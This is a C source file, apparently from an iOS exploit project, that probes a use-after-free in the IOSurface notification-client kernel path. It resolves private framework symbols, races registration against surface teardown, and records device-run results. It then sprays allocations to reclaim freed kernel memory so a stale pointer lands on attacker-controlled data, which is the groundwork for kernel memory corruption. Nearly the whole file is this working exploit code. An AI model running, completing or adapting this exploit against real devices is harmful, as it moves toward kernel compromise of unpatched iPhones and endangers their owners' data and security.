//
//  IOSurfaceNotifyProbe.c
//  ANE-Exploit
//
//  Probe for CVE-2026-112477 (IOSurface notification-client UAF).
//
//  iOS 27.2 added two instructions missing in 27.0.1:
//    - IOSurfaceClient teardown sets a "dead" flag at client+0xf1;
//    - the notify-registration path refuses a client carrying that flag
//      (returns 0xe00002d8, kIOReturnNotAttached).
//
//  Without them a client can be registered in a surface's notification list
//  after it has been torn down, leaving a dangling reference that the list walk
//  dereferences later.
//
//  User space reaches the code through private IOSurface.framework entry
//  points (selectors 0x11 and 0x12 on IOSurfaceRootUserClient):
//    IOSurfaceClientSetSurfaceNotify(mach_port_t, u64, u64)
//    IOSurfaceClientRemoveSurfaceNotify(u64)
//
//  Neither the header nor the framework is in the public iOS SDK, so every
//  symbol is resolved with dlsym at runtime.
//

#include <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

extern void log_from_c(const char *msg);

typedef struct __IOSurface *IOSurfaceRef;

typedef kern_return_t (*set_notify_fn)(mach_port_t, uint64_t, uint64_t);
typedef kern_return_t (*remove_notify_fn)(uint64_t);
typedef IOSurfaceRef (*create_fn)(CFDictionaryRef);
typedef uint32_t (*get_id_fn)(IOSurfaceRef);

static set_notify_fn gSet;
static remove_notify_fn gRemove;
static create_fn gCreate;
static get_id_fn gGetID;
static mach_port_t gPort = MACH_PORT_NULL;
static volatile int gStop = 0;
static volatile uint32_t gSurfaceID = 0;
static volatile int gUseOrder = 0;   // 0: (id, type)   1: (type, id)
static volatile int gLogged = 0;

static void say(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    log_from_c(buf);
}

static IOSurfaceRef make_surface(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef w = CFNumberCreate(NULL, kCFNumberIntType, &(int){256});
    CFNumberRef h = CFNumberCreate(NULL, kCFNumberIntType, &(int){256});
    CFNumberRef bpe = CFNumberCreate(NULL, kCFNumberIntType, &(int){4});
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), w);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), h);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bpe);
    IOSurfaceRef s = gCreate(props);
    CFRelease(w); CFRelease(h); CFRelease(bpe); CFRelease(props);
    return s;
}

static void *setter_thread(void *arg) {
    (void)arg;
    while (!gStop) {
        uint32_t sid = gSurfaceID;
        if (sid == 0) continue;
        kern_return_t kr = gUseOrder ? gSet(gPort, 1, sid) : gSet(gPort, sid, 1);
        if (kr != 0 && gLogged < 12) { gLogged++; say("[set] order=%d kr=0x%x", gUseOrder, kr); }
    }
    return NULL;
}

static void *remover_thread(void *arg) {
    (void)arg;
    while (!gStop) {
        uint32_t sid = gSurfaceID;
        if (sid == 0) continue;
        kern_return_t kr = gRemove(sid);
        if (kr != 0 && gLogged < 12) { gLogged++; say("[rem] kr=0x%x", kr); }
    }
    return NULL;
}

void run_iosurface_notify_probe(void) {
    say("[*] IOSurface notify probe v14 build14 spray-then-touch");

    // Already loaded in every UIKit process; open by path anyway so dlsym works.
    void *fh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                      RTLD_NOW);
    if (!fh) fh = dlopen("IOSurface", RTLD_NOW);
    if (!fh) {
        say("[-] dlopen IOSurface failed: %s", dlerror());
        return;
    }

    gSet    = (set_notify_fn)dlsym(fh, "IOSurfaceClientSetSurfaceNotify");
    gRemove = (remove_notify_fn)dlsym(fh, "IOSurfaceClientRemoveSurfaceNotify");
    gCreate = (create_fn)dlsym(fh, "IOSurfaceCreate");
    gGetID  = (get_id_fn)dlsym(fh, "IOSurfaceGetID");

    say("[*] Set=%p Remove=%p Create=%p GetID=%p",
        (void *)gSet, (void *)gRemove, (void *)gCreate, (void *)gGetID);
    if (!gSet || !gRemove || !gCreate || !gGetID) {
        say("[-] one or more symbols missing");
        return;
    }

    kern_return_t kr = mach_port_allocate(mach_task_self(),
                                          MACH_PORT_RIGHT_RECEIVE, &gPort);
    say("[*] notify port 0x%x (kr=0x%x)", gPort, kr);
    if (kr != KERN_SUCCESS) return;

    IOSurfaceRef surf = make_surface();
    if (!surf) { say("[-] IOSurfaceCreate failed"); return; }
    uint32_t sid = gGetID(surf);
    gSurfaceID = sid;
    say("[+] surface id 0x%x", sid);

    // First, which argument order is accepted at all?
    for (int order = 0; order < 2; order++) {
        gUseOrder = order;
        kern_return_t a = order ? gSet(gPort, 1, sid) : gSet(gPort, sid, 1);
        kern_return_t b = gRemove(sid);
        say("[*] order=%d  set=0x%x  remove=0x%x", order, a, b);
    }
    // order 0 = set(port, surfaceID, type): the async call accepts it but no
    //           association is made, remove() then returns bad argument.
    // order 1 = set(port, type, surfaceID): the real one, remove() returns 0.
    // Confirmed on device, 27.0.1. The race uses order 1.
    gUseOrder = 1;

    // A tight set/set loop returns 0xe00002c9 (kIOReturnInternalError): the
    // client already exists, so a second registration is refused. The useful
    // sequence is therefore set -> remove -> set, not set -> set. Measure the
    // plain pairs first, on a surface that stays alive.
    say("[*] sequential pairs on a stable surface");
    for (int i = 0; i < 5; i++) {
        kern_return_t a = gSet(gPort, 1, sid);
        kern_return_t b = gRemove(sid);
        say("[seq %d] set=0x%x remove=0x%x", i, a, b);
    }

    // The teardown of the client happens when the surface is released. Clearing
    // gSurfaceID *before* the release made both threads hammer a dead id and
    // every call returned bad-argument, so no race ever occurred. Keep the id
    // live across the release: the threads then register against a client that
    // is being torn down, which is exactly the window the 27.2 patch closes.
    say("[*] race: settle, then set during release, order=%d", gUseOrder);
    pthread_t ts, tr;
    pthread_create(&ts, NULL, setter_thread, NULL);
    pthread_create(&tr, NULL, remover_thread, NULL);

    for (int i = 0; i < 400 && !gStop; i++) {
        usleep(2000);                 // let the threads settle on the live id
        CFRelease(surf);              // teardown starts here, id still published
        surf = make_surface();
        if (!surf) { say("[-] recreate failed at %d", i); break; }
        gSurfaceID = gGetID(surf);
        if ((i % 50) == 0) say("[*] iteration %d, surface 0x%x", i, gSurfaceID);
    }

    gStop = 1;
    pthread_join(ts, NULL);
    pthread_join(tr, NULL);

    // Device run v12 showed: after the concurrent phase, a *fresh* surface
    // that happens to receive the same id gets
    //     set    = 0xe00002c9 (kIOReturnInternalError - "already registered")
    //     remove = 0x0        (the stale entry is found and cleaned)
    // So the surviving state is keyed by surface id and outlives the surface.
    // This phase drops a surface while its client is still registered, waits
    // for the id to be handed out again, and then touches that id.
    // Device run v13 proved the state survives the surface:
    //     [A] surface 0x128 set=0x0
    //     [A] released without remove
    //     [B] id 0x128 reused after 0 allocations
    //     [B] set    = 0xe00002c9   ("already registered" - the stale client lives)
    //     [B] remove = 0x0          (the stale client is found and freed)
    // So a client object outlives its surface and keeps a pointer to it at
    // +0xe8 while the surface memory is freed. The next step reclaims that freed
    // memory with controlled allocations before touching the stale client, so a
    // dereference of client->surface hits memory we own.
    say("[*] phase A: register, drop the surface, then spray to reclaim its memory");
    IOSurfaceRef a = make_surface();
    if (a) {
        uint32_t ida = gGetID(a);
        say("[A] surface 0x%x set=0x%x", ida, gSet(gPort, 1, ida));
        CFRelease(a);
        say("[A] released without remove");

        enum { SPRAY = 48 };
        static IOSurfaceRef keep[SPRAY];
        int kept = 0;
        for (int i = 0; i < SPRAY; i++) {
            IOSurfaceRef s2 = make_surface();
            if (!s2) break;
            keep[kept++] = s2;
        }
        say("[*] sprayed %d surfaces", kept);
        for (int i = 0; i < kept; i++) {
            uint32_t sid2 = gGetID(keep[i]);
            if (sid2 == ida) say("[*] sprayed surface %d landed on id 0x%x", i, sid2);
        }

        say("[B] touching the stale id 0x%x after the spray", ida);
        kern_return_t rs = gSet(gPort, 1, ida);
        say("[B] set    = 0x%x", rs);
        kern_return_t rr = gRemove(ida);
        say("[B] remove = 0x%x", rr);
        kern_return_t rs2 = gSet(gPort, 1, ida);
        say("[B] set again = 0x%x", rs2);

        for (int i = 0; i < kept; i++) CFRelease(keep[i]);
    }

    say("[*] probe finished, no crash");
}

